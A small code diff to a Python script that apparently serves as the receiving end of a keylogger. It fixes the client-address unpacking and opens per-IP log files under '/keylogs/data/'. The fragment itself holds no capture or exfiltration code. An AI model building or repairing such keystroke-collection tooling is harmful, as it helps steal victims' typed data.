@@ -90,7 +90,7 @@ if __name__ == '__main__':
     receiver_t.start()
 
     if argument.r:
-        _, client_address = server_socket.getpeername()
+        client_address = server_socket.getpeername()
         ficname = f"{client_address[0]}-{datetime.date.today()}.txt"
 
         with open("/keylogs/data/" + ficname, "r") as f:
